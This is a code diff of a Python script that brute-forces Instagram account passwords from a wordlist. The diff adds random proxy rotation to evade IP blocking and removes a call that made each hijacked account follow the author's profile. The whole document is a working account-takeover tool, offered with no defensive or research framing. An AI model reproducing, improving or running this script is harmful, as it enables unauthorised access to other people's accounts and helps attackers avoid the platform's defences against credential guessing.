@@ -2,6 +2,8 @@ import requests
 import json
 import time
 import os
+import random
+
 
 filename = 'pass.txt'
 if os.path.isfile(filename):
@@ -27,8 +29,11 @@ def userExists(username):
 		return {'username':username,'id':fUserID}
 
 
-def Login(username,password):
+def Login(username,password, proxy):
 	sess = requests.Session()
+
+	sess.proxies = { "http": proxy, "https": proxy }
+
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
 		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
@@ -67,14 +72,17 @@ def Login(username,password):
 
 
 
-def follow(sess, username):
-	username = userExists(username)
-	if (username == False):
-		return	
-	else:
-		userID = username['id']
-		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
-		print (followReq.text)
+
+###Start###
+
+def RandomProxy():
+	myProxy = random.choice(open('proxy.txt').read().splitlines())
+	#r = requests.get('http://myexternalip.com/raw') 
+	#print (''r.text)
+	#r = requests.get('http://myexternalip.com/raw', proxies={ "http": myProxy, "https": myProxy }) 
+	#print (r.text)
+	return myProxy
+
 
 
 username = str(input('Please enter a username: '))
@@ -89,14 +97,19 @@ else:
 delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 
 
 
+UsePorxy = input('Do you want to use proxy (y/n): ')
+if (UsePorxy == 'y'):
+	myProxy = RandomProxy()
+	print ('Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": myProxy, "https": myProxy }).text)
+else:
+	myProxy = ''
+
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username,password)
+	sess = Login(username, password, myProxy)
 	if (sess):
 		print ('Login success %s' % [username,password])
 
-		#because i am cool
-		follow(sess,'avr_amit')
 
 	try:
 		time.sleep(delayLoop)
@@ -108,3 +121,14 @@ for i in range(len(passwords)):
 			continue
 		
 
+
+'''
+def follow(sess, username):
+	username = userExists(username)
+	if (username == False):
+		return	
+	else:
+		userID = username['id']
+		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
+		print (followReq.text)
+'''
